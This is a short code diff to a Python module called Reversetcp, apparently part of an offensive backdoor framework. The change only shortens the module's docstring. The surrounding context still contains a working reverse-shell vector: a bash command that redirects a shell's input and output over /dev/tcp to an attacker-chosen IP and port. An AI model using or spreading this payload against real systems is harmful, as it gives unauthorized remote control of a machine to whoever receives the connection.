@@ -18,9 +18,7 @@ from core.parameters import ParametersList, Parameter as P
 classname = 'Reversetcp'
     
 class Reversetcp(Module):
-    """Send reverse TCP shell  
-    :backdoor.reverse_tcp <ip> <port>
-    """
+    """Send reverse TCP shell"""
     
     vectors = VectorList([
             Vector('shell.sh', 'devtcp', "/bin/bash -c \'/bin/bash 0</dev/tcp/%s/%s 1>&0 2>&0\'"),
